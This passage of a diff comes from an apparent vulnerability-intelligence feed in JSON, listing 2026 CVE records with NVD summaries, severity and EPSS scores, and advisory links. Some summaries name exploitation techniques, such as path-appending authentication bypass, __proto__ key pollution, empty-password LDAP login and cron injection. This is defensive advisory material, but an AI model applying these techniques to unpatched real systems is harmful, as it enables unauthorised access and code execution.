-    ]
-  },
-  {
-    "cve_id": "CVE-2026-82404",
-    "published": "2026-09-02T17:18:00.223",
-    "last_modified": "2026-09-09T21:04:42.813",
-    "cvss_v3": 8.3,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "TOON is a compact, human-readable serialization of JSON data for LLM prompts. Prior to 2.3.1, decoding attacker-controlled TOON with a __proto__, constructor, or prototype key wrote through the object prototype chain instead of creating an own property, polluting Object.prototype for the runtime. In packages/toon/src/decode/expand.ts, the expandPaths: 'safe' path and insertPathSafe function made dotted keys such as a.__proto__.x the strongest vector, while plain nested objects, tabular rows, quoted keys, and streaming decode were also affected. The encoder also dropped own __proto__ properties and could invoke an inherited setter during normalization. Services that decode untrusted TOON could experience denial of service or, when a suitable downstream gadget is present, remote code execution. This issue is fixed in version 2.3.1.",
-    "references": [
-      "https://github.com/toon-format/toon/commit/94a2b7560b2b5ed903a4d466a3bce8b13daa2660",
-      "https://github.com/toon-format/toon/pull/316",
-      "https://github.com/toon-format/toon/releases/tag/v2.3.1",
-      "https://github.com/toon-format/toon/security/advisories/GHSA-p95v-992w-h6c3"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 33.4,
-    "tags": [
-      "dos",
-      "rce"
-    ],
-    "intel_score": 84.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30",
-      "dos+3"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-27140",
-    "published": "2026-04-08T02:16:02.887",
-    "last_modified": "2026-09-10T13:17:57.537",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "SWIG file names containing 'cgo' and well-crafted payloads could lead to code smuggling and arbitrary code execution at build time due to trust layer bypass.",
-    "references": [
-      "https://go.dev/cl/763768",
-      "https://go.dev/issue/78335",
-      "https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU",
-      "https://pkg.go.dev/vuln/GO-2026-4871",
-      "https://access.redhat.com/errata/RHSA-2026:10217",
-      "https://access.redhat.com/errata/RHSA-2026:10219",
-      "https://access.redhat.com/errata/RHSA-2026:10704",
-      "https://access.redhat.com/errata/RHSA-2026:16021",
-      "https://access.redhat.com/errata/RHSA-2026:16024",
-      "https://access.redhat.com/errata/RHSA-2026:16494",
-      "https://access.redhat.com/errata/RHSA-2026:16497",
-      "https://access.redhat.com/errata/RHSA-2026:16498",
-      "https://access.redhat.com/errata/RHSA-2026:16694",
-      "https://access.redhat.com/errata/RHSA-2026:16697",
-      "https://access.redhat.com/errata/RHSA-2026:16698",
-      "https://access.redhat.com/errata/RHSA-2026:23246",
-      "https://access.redhat.com/errata/RHSA-2026:25182",
-      "https://access.redhat.com/errata/RHSA-2026:34099",
-      "https://access.redhat.com/errata/RHSA-2026:56854",
-      "https://access.redhat.com/errata/RHSA-2026:57408",
-      "https://access.redhat.com/errata/RHSA-2026:57545",
-      "https://access.redhat.com/security/cve/CVE-2026-27140",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2456341",
-      "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-27140.json"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.7,
-    "epss_percentile": 49.6,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-45447",
-    "published": "2026-06-09T17:17:19.277",
-    "last_modified": "2026-09-11T13:18:10.853",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Issue summary: A specially crafted PKCS#7 or S/MIME signed message could\ntrigger a use-after-free during PKCS#7 signature verification.\n\nImpact summary: A use-after-free may result in process crashes, heap\ncorruption, or potentially remote code execution.\n\nWhen processing a PKCS#7 or S/MIME signed message, if the SignedData\ndigestAlgorithms field is present as an empty ASN.1 SET, OpenSSL may\nincorrectly free a caller-owned BIO during PKCS7_verify(). A subsequent\nuse of the BIO by the calling application results in a use-after-free\ncondition.\n\nIn the common case this occurs when the application later calls\nBIO_free() on the BIO originally passed to PKCS7_verify(). Depending\non allocator behavior and application-specific BIO usage patterns, this\nmay result in a crash or other memory corruption. In some application\ncontexts this may potentially be exploitable for remote code execution.\n\nApplications that process PKCS#7 or S/MIME signed messages using OpenSSL\nPKCS#7 APIs may be affected. Applications using the CMS APIs for this\nprocessing are not affected.\n\nThe FIPS modules in 4.0, 3.6, 3.5, 3.4, and 3.0 are not affected by this\nissue, as the affected code is outside the OpenSSL FIPS module boundary.",
-    "references": [
-      "https://github.com/openssl/openssl/commit/3aad5eb7af4de4ee0633c30a8541a54d9bbde63c",
-      "https://github.com/openssl/openssl/commit/7d4a980c62258c5910cc883936e0c8dbab4d75a8",
-      "https://github.com/openssl/openssl/commit/9dfd688ad2290fc5075cacbc9bf0c9a93eefed54",
-      "https://github.com/openssl/openssl/commit/a541ae8bfe849a30cc885e8780715c0f488e496c",
-      "https://github.com/openssl/openssl/commit/c505d7559da5d5f9f2c3913c6883a5562ce7273e",
-      "https://openssl-library.org/news/secadv/20260609.txt",
-      "https://access.redhat.com/errata/RHSA-2026:25237",
-      "https://access.redhat.com/errata/RHSA-2026:25239",
-      "https://access.redhat.com/errata/RHSA-2026:26275",
-      "https://access.redhat.com/errata/RHSA-2026:26319",
-      "https://access.redhat.com/errata/RHSA-2026:29197",
-      "https://access.redhat.com/errata/RHSA-2026:34102",
-      "https://access.redhat.com/errata/RHSA-2026:35869",
-      "https://access.redhat.com/errata/RHSA-2026:36215",
-      "https://access.redhat.com/errata/RHSA-2026:36217",
-      "https://access.redhat.com/errata/RHSA-2026:39009",
-      "https://access.redhat.com/errata/RHSA-2026:39012",
-      "https://access.redhat.com/errata/RHSA-2026:39981",
-      "https://access.redhat.com/errata/RHSA-2026:44438",
-      "https://access.redhat.com/errata/RHSA-2026:47735",
-      "https://access.redhat.com/errata/RHSA-2026:47737",
-      "https://access.redhat.com/errata/RHSA-2026:58563",
-      "https://access.redhat.com/errata/RHSA-2026:58981",
-      "https://access.redhat.com/errata/RHSA-2026:59831",
-      "https://access.redhat.com/errata/RHSA-2026:66524",
-      "https://access.redhat.com/security/cve/CVE-2026-45447",
-      "https://bugzilla.redhat.com/show_bug.cgi?id=2481898",
-      "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-45447.json"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 3.6,
-    "epss_percentile": 88.7,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-64827",
-    "published": "2026-08-03T14:16:27.630",
-    "last_modified": "2026-09-09T20:40:01.933",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Telenia Software TVox 26.5.3 and prior 26.x versions, and 24.9.21 and prior 24.x versions, contain an authentication bypass vulnerability in set_env.php where the redirectToLoginAdminIRequestHaveAccessToken() function derives the current page name from PHP_SELF and skips authentication when the value matches 'login_admin.php'. Attackers can append '/login_admin.php' to the path of any target PHP script to cause the authentication check to pass and gain unauthenticated access to all PHP scripts under the manager HTML directory.",
-    "references": [
-      "https://karmainsecurity.com/KIS-2026-14",
-      "https://www.teleniasoftware.com/",
-      "https://www.vulncheck.com/advisories/telenia-tvox-authentication-bypass-via-set-env-php",
-      "http://seclists.org/fulldisclosure/2026/Aug/30"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 39.9,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-61514",
-    "published": "2026-08-04T15:16:36.810",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Puwell IP Camera firmware versions 2.x through 4.x contains an authentication bypass vulnerability that allows unauthenticated attackers to access device functions by sending protocol-conforming packets over TCP port 23456 without credentials. Attackers can exploit the unvalidated Session field in the proprietary control protocol header to access live video streams, control pan and tilt motors, activate audio functions, and remotely restart the device.",
-    "references": [
-      "https://damiri.fr/fr/cve/CVE-2026-61514",
-      "https://www.puwell.com/",
-      "https://www.vulncheck.com/advisories/puwell-ip-camera-2-x-4-x-unauthenticated-access-via-tcp-port-23456"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 38.8,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-13738",
-    "published": "2026-08-11T12:17:37.923",
-    "last_modified": "2026-09-11T14:25:13.003",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "CommServe contained an authorization bypass vulnerability affecting a limited set of command execution operations.  Software customers upgrade to resolved maintenance release.  Update all Commvault installations, including Commserve, Webserver, Command Center, Media Agents, Clients and HyperScale X.",
-    "references": [
-      "https://documentation.commvault.com/securityadvisories/CV_2026_07_9.html"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 48.2,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-72840",
-    "published": "2026-08-13T22:17:23.640",
-    "last_modified": "2026-09-09T20:35:08.537",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "OpenWrt LuCI contains an overly permissive ACL definition in luci-mod-system-mounts that grants write access to /etc/crontabs/root to users intended only for mount configuration. Authenticated users with only the mount-configuration ACL group can append arbitrary cron entries via ubus file.write, which the default busybox crond daemon executes as root within one minute.",
-    "references": [
-      "https://github.com/openwrt/luci/security/advisories/GHSA-v5f9-62c7-cw29",
-      "https://www.vulncheck.com/advisories/openwrt-luci-luci-mod-system-mounts-acl-root-rce-via-crontab-write",
-      "https://github.com/openwrt/luci/security/advisories/GHSA-v5f9-62c7-cw29"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 31.8,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-58095",
-    "published": "2026-08-26T06:16:26.460",
-    "last_modified": "2026-09-10T15:39:29.340",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "mp_Enddisc() used incorrect length calculations when formatting endpoint discriminator addresses for display, allowing a received endpoint option to overflow a global result buffer.\n\nA malicious PPP peer can crash ppp(8) or potentially execute arbitrary code as root.",
-    "references": [
-      "https://security.freebsd.org/advisories/FreeBSD-SA-26:60.ppp.asc"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 45.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-58096",
-    "published": "2026-08-26T06:16:26.577",
-    "last_modified": "2026-09-10T15:39:04.077",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "LcpDecodeConfig() did not validate the length of received endpoint discriminator options against the minimum required by RFC 1717.  Undersized options would trigger an out-of-bounds write.\n\nA malicious PPP peer can exploit CVE-2026-58095 and CVE-2026-58096 to crash ppp(8) or potentially execute arbitrary code as root.",
-    "references": [
-      "https://security.freebsd.org/advisories/FreeBSD-SA-26:60.ppp.asc"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.6,
-    "epss_percentile": 45.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-54721",
-    "published": "2026-08-27T20:17:49.973",
-    "last_modified": "2026-09-09T21:09:13.080",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Silverstripe UserForms provides a visual form builder for the Silverstripe CMS. From 6.0.0 until 6.4.9, 7.0.7, and 7.1.1, the userform email recipient subject field in the CMS accepts a specially crafted payload that can be interpreted as executable server-side code. An authenticated CMS user with permission to configure a UserForms email recipient can use the subject field to run arbitrary code on the server, compromising confidentiality, integrity, and availability. This issue is fixed in versions 6.4.9, 7.0.7, and 7.1.1.",
-    "references": [
-      "https://github.com/silverstripe/silverstripe-userforms/commit/23c069866900c19b499bfa997d1e251e97491702",
-      "https://github.com/silverstripe/silverstripe-userforms/commit/c55494ad7c717b199a3c1663b43a54db5d95604c",
-      "https://github.com/silverstripe/silverstripe-userforms/pull/1441",
-      "https://github.com/silverstripe/silverstripe-userforms/pull/1442",
-      "https://github.com/silverstripe/silverstripe-userforms/releases/tag/6.4.9",
-      "https://github.com/silverstripe/silverstripe-userforms/releases/tag/7.0.7",
-      "https://github.com/silverstripe/silverstripe-userforms/releases/tag/7.1.1",
-      "https://github.com/silverstripe/silverstripe-userforms/security/advisories/GHSA-g8wr-r2v2-vqc6"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 35.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-84645",
-    "published": "2026-09-02T16:17:29.193",
-    "last_modified": "2026-09-11T21:15:29.510",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In Jenkins 2.579 and earlier, LTS 2.568.2 and earlier, objects of types marked as storing their configuration in independent top-level configuration files in Jenkins (such as the global configuration and jobs) can appear as nested field values in user-submitted `config.xml` documents and subsequently handle HTTP requests via Stapler, resulting in remote code execution.",
-    "references": [
-      "https://www.jenkins.io/security/advisory/2026-09-02/#SECURITY-3972"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.7,
-    "epss_percentile": 49.4,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-85216",
-    "published": "2026-09-03T15:17:40.893",
-    "last_modified": "2026-09-10T19:42:07.660",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "MISP contains an authentication bypass vulnerability in its LDAP and LinOTP authentication components due to insufficient validation of user-supplied credentials.\n\nThe custom LdapAuthenticate and LinOTPAuthenticate components replace CakePHP's FormAuthenticate implementation but did not replicate its credential validation checks. As a result, empty or non-string values could reach the underlying authentication mechanisms.\n\nIn the LDAP authentication path, an attacker able to identify a valid directory user's email address could submit an empty password. The empty credential could be passed to ldap_bind(), where an LDAP server accepting unauthenticated binds may return a successful result for a valid distinguished name combined with an empty password. MISP could consequently treat the attacker as the corresponding authenticated directory user without verification of the user's password.\n\nThe issue also affected the LinOTP authentication component. Invalid credential types were not rejected before being processed, and when mixed authentication was enabled, an empty password could be checked against a locally stored MISP password hash. LDAP-provisioned MISP accounts could additionally be created with an empty local password because account creation skipped normal validation, resulting in a hash corresponding to an empty password. This could permit authentication through the local fallback mechanism when such an account was no longer resolved through LDAP.\n\nSuccessful exploitation could allow a remote unauthenticated attacker to impersonate an existing MISP user. If the targeted account has administrative or other privileged permissions, the attacker could gain corresponding access to sensitive threat-intelligence data, modify or delete information, alter configuration, or perform other privileged operations.\n\nThe patch resolves the vulnerability by requiring authentication identifiers and passwords to be valid strings, rejecting empty passwords where they are not explicitly permitted, and assigning a randomly generated local password to LDAP-provisioned accounts instead of storing a hash derived from an empty password.",
-    "references": [
-      "https://github.com/MISP/MISP/commit/0ee058548"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 41.0,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-85610",
-    "published": "2026-09-04T12:17:24.463",
-    "last_modified": "2026-09-10T16:17:59.793",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "OpenPanel before 2.3.0 fails to properly validate chart formula expressions, allowing authenticated project members with read access to execute arbitrary code by recovering the native JavaScript Function constructor through mathjs matrix objects. Attackers can use the recovered constructor to load Node.js built-ins and execute operating system commands with the privileges of the API process, bypassing organization authorization boundaries.",
-    "references": [
-      "https://github.com/Openpanel-dev/openpanel/security/advisories/GHSA-7476-c5cc-8999",
-      "https://www.vulncheck.com/advisories/openpanel-before-2.3.0-remote-code-execution-via-chart-formulas"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 32.9,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-86169",
-    "published": "2026-09-05T11:16:45.703",
-    "last_modified": "2026-09-12T00:17:05.260",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Axolotl before 0.19.0 contains a remote code execution vulnerability in the multipack patch path where trust_remote_code defaults to None instead of False, causing the security guard to be bypassed. Attackers can execute arbitrary Python code by crafting a malicious Hugging Face model repository selected as base_model, which is loaded with hardcoded trust_remote_code=True during AutoModelForCausalLM.from_pretrained.",
-    "references": [
-      "https://github.com/axolotl-ai-cloud/axolotl",
-      "https://github.com/axolotl-ai-cloud/axolotl/blob/v0.18.0/src/axolotl/loaders/patch_manager.py#L794-L806",
-      "https://github.com/axolotl-ai-cloud/axolotl/blob/v0.18.0/src/axolotl/monkeypatch/multipack.py#L86-L96",
-      "https://github.com/axolotl-ai-cloud/axolotl/commit/b62d60b101eea7f32532ee3c0b17c2f2430a9262",
-      "https://github.com/axolotl-ai-cloud/axolotl/pull/3858",
-      "https://github.com/axolotl-ai-cloud/axolotl/releases/tag/v0.19.0",
-      "https://www.vulncheck.com/advisories/axolotl-through-0.18.0-remote-code-execution-via-multipack-patching"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.5,
-    "epss_percentile": 41.0,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-86712",
-    "published": "2026-09-08T12:16:59.990",
-    "last_modified": "2026-09-10T16:18:03.470",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "SiYuan before 3.8.2 trusts the attacker-writable text/siyuan clipboard MIME type and skips sanitization in the paste handler, allowing code execution in the Node-enabled desktop renderer. Attackers can craft malicious web pages that write to the clipboard, and when pasted into SiYuan, injected scripts execute with full Node.js access through the Electron main process.",
-    "references": [
-      "https://github.com/siyuan-note/siyuan",
-      "https://github.com/siyuan-note/siyuan/blob/v3.8.1/app/src/protyle/util/paste.ts",
-      "https://github.com/siyuan-note/siyuan/commit/9ce660652de2ced26ec2d98a5a242cb0b8bb7273",
-      "https://github.com/siyuan-note/siyuan/releases/tag/v3.8.2",
-      "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-9rr9-pxr4-gcgc",
-      "https://www.vulncheck.com/advisories/siyuan-before-3.8.2-remote-code-execution-via-clipboard"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.4,
-    "epss_percentile": 31.1,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-77089",
-    "published": "2026-09-08T13:17:25.227",
-    "last_modified": "2026-09-11T14:25:43.913",
-    "cvss_v3": 9.8,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "Command Center API contained an authentication bypass issue affecting privilege management. Software customers upgrade to resolved maintenance release. Update Command Center.",
-    "references": [
-      "https://documentation.commvault.com/securityadvisories/CV_2026_07_1.html"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 25.8,
-    "tags": [
-      "auth_bypass"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "auth_bypass+25"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-28609",
-    "published": "2026-09-08T19:17:53.053",
-    "last_modified": "2026-09-10T15:17:29.587",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In read of MatroskaExtractor.cpp, there is a possible out-of-bounds write due to improper casting. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation.",
-    "references": [
-      "https://source.android.com/docs/security/bulletin/2026/2026-09-01"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 19.3,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-28618",
-    "published": "2026-09-08T19:17:53.970",
-    "last_modified": "2026-09-10T15:17:30.417",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In dec_frm_prepare of oapv.c, there is a possible OOB write due to a heap buffer overflow. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation.",
-    "references": [
-      "https://source.android.com/docs/security/bulletin/2026/2026-09-01"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 26.5,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-49879",
-    "published": "2026-09-08T19:17:58.370",
-    "last_modified": "2026-09-10T14:17:01.770",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In multiple functions of rw_t3t.cc, there is a possible out of bounds write due to an integer overflow. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation.",
-    "references": [
-      "https://source.android.com/docs/security/bulletin/2026/2026-09-01"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 21.5,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-49882",
-    "published": "2026-09-08T19:17:58.563",
-    "last_modified": "2026-09-10T14:17:02.123",
-    "cvss_v3": 8.8,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "In rw_mfc_handle_read_op of rw_mfc.cc, there is a possible memory safety issue due to a heap buffer overflow. This could lead to remote code execution with no additional execution privileges needed. User interaction is not needed for exploitation.",
-    "references": [
-      "https://source.android.com/docs/security/bulletin/2026/2026-09-01"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 22.5,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 84.0,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-40877",
-    "published": "2026-08-24T19:16:38.647",
-    "last_modified": "2026-09-09T21:06:39.057",
-    "cvss_v3": 8.7,
-    "severity": "HIGH",
-    "affected": [],
-    "summary": "Combodo iTop is a web-based IT service management tool. Prior to 3.2.3, iTop is vulnerable to PHP object injection in the user preference functionality, which can lead to remote code execution. This issue has been fixed in version 3.2.3.",
-    "references": [
-      "https://github.com/Combodo/iTop/security/advisories/GHSA-3mq5-p5vh-cw7r"
-    ],
-    "source": "NVD",
-    "cisa_kev": false,
-    "epss": 0.3,
-    "epss_percentile": 24.6,
-    "tags": [
-      "rce"
-    ],
-    "intel_score": 83.5,
-    "reasons": [
-      "recently modified (last 48h)",
-      "rce+30"
-    ]
-  },
-  {
-    "cve_id": "CVE-2026-39821",
-    "published": "2026-05-22T16:16:20.410",
-    "last_modified": "2026-09-11T13:17:49.237",
-    "cvss_v3": 9.6,
-    "severity": "CRITICAL",
-    "affected": [],
-    "summary": "The ToASCII and ToUnicode functions incorrectly accept Punycode-encoded labels that decode to an ASCII-only label. For example, ToUnicode(\"xn--example-.com\") incorrectly returns the name \"example.com\" rather than an error. This behavior can lead to privilege escalation in programs using the idna package. For example, a program which performs privilege checks on the ASCII hostname may reject \"example.com\" but permit \"xn--example-.com\". If that program subsequently converts the ASCII hostname to Unicode, it will inadvertently permits access to the Unicode name \"example.com\".",
-    "references": [
-      "https://go.dev/cl/767220",
-      "https://go.dev/issue/78760",
-      "https://groups.google.com/g/golang-announce/c/94pEornpRlI",
-      "https://groups.google.com/g/golang-announce/c/iI-mYSI0lu8",
-      "https://pkg.go.dev/vuln/GO-2026-5026",
-      "https://access.redhat.com/errata/RHSA-2026:23262",
-      "https://access.redhat.com/errata/RHSA-2026:23264",
-      "https://access.redhat.com/errata/RHSA-2026:26546",
-      "https://access.redhat.com/errata/RHSA-2026:26547",
-      "https://access.redhat.com/errata/RHSA-2026:30650",
-      "https://access.redhat.com/errata/RHSA-2026:30651",
-      "https://access.redhat.com/errata/RHSA-2026:30853",
-      "https://access.redhat.com/errata/RHSA-2026:30854",
-      "https://access.redhat.com/errata/RHSA-2026:30855",
-      "https://access.redhat.com/errata/RHSA-2026:33155",
-      "https://access.redhat.com/errata/RHSA-2026:33160",
-      "https://access.redhat.com/errata/RHSA-2026:33163",
-      "https://access.redhat.com/errata/RHSA-2026:33173",
-      "https://access.redhat.com/errata/RHSA-2026:33183",
-      "https://access.redhat.com/errata/RHSA-2026:33524",
-      "https://access.redhat.com/errata/RHSA-2026:33531",
-      "https://access.redhat.com/errata/RHSA-2026:34342",
-      "https://access.redhat.com/errata/RHSA-2026:34357",
-      "https://access.redhat.com/errata/RHSA-2026:34359",
-      "https://access.redhat.com/errata/RHSA-2026:34364",
-      "https://access.redhat.com/errata/RHSA-2026:34789",
-      "https://access.redhat.com/errata/RHSA-2026:35826",
-      "https://access.redhat.com/errata/RHSA-2026:35827",
-      "https://access.redhat.com/errata/RHSA-2026:35828",
-      "https://access.redhat.com/errata/RHSA-2026:35829",
-      "https://access.redhat.com/errata/RHSA-2026:35830",
-      "https://access.redhat.com/errata/RHSA-2026:35831",
-      "https://access.redhat.com/errata/RHSA-2026:35993",
-      "https://access.redhat.com/errata/RHSA-2026:35994",
-      "https://access.redhat.com/errata/RHSA-2026:36105",
-      "https://access.redhat.com/errata/RHSA-2026:36167",
-      "https://access.redhat.com/errata/RHSA-2026:36207",
-      "https://access.redhat.com/errata/RHSA-2026:36648",
-      "https://access.redhat.com/errata/RHSA-2026:36651",
-      "https://access.redhat.com/errata/RHSA-2026:36796",
-      "https://access.redhat.com/errata/RHSA-2026:36797",
-      "https://access.redhat.com/errata/RHSA-2026:36808",
-      "https://access.redhat.com/errata/RHSA-2026:36820",
-      "https://access.redhat.com/errata/RHSA-2026:36883",
-      "https://access.redhat.com/errata/RHSA-2026:37387",
-      "https://access.redhat.com/errata/RHSA-2026:37435",
-      "https://access.redhat.com/errata/RHSA-2026:37436",
-      "https://access.redhat.com/errata/RHSA-2026:38995",
-      "https://access.redhat.com/errata/RHSA-2026:39005",
-      "https://access.redhat.com/errata/RHSA-2026:39573",
-      "https://access.redhat.com/errata/RHSA-2026:39879",
-      "https://access.redhat.com/errata/RHSA-2026:40118",
-      "https://access.redhat.com/errata/RHSA-2026:40262",
-      "https://access.redhat.com/errata/RHSA-2026:40945",
-      "https://access.redhat.com/errata/RHSA-2026:41019",
-      "https://access.redhat.com/errata/RHSA-2026:41030",
-      "https://access.redhat.com/errata/RHSA-2026:41031",
-      "https://access.redhat.com/errata/RHSA-2026:41036",
-      "https://access.redhat.com/errata/RHSA-2026:41055",
-      "https://access.redhat.com/errata/RHSA-2026:41066",
-      "https://access.redhat.com/errata/RHSA-2026:41928",
-      "https://access.redhat.com/errata/RHSA-2026:41930",
-      "https://access.redhat.com/errata/RHSA-2026:42043",
-      "https://access.redhat.com/errata/RHSA-2026:42047",
-      "https://access.redhat.com/errata/RHSA-2026:42048",
-      "https://access.redhat.com/errata/RHSA-2026:42049",
-      "https://access.redhat.com/errata/RHSA-2026:42050",
-      "https://access.redhat.com/errata/RHSA-2026:42051",
-      "https://access.redhat.com/errata/RHSA-2026:42078",
-      "https://access.redhat.com/errata/RHSA-2026:42079",
-      "https://access.redhat.com/errata/RHSA-2026:42080",
-      "https://access.redhat.com/errata/RHSA-2026:42082",
-      "https://access.redhat.com/errata/RHSA-2026:42132",
-      "https://access.redhat.com/errata/RHSA-2026:42142",
-      "https://access.redhat.com/errata/RHSA-2026:42146",
-      "https://access.redhat.com/errata/RHSA-2026:42150",
-      "https://access.redhat.com/errata/RHSA-2026:42151",
-      "https://access.redhat.com/errata/RHSA-2026:42240",
-      "https://access.redhat.com/errata/RHSA-2026:42644",
-      "https://access.redhat.com/errata/RHSA-2026:42796",
-      "https://access.redhat.com/errata/RHSA-2026:42852",
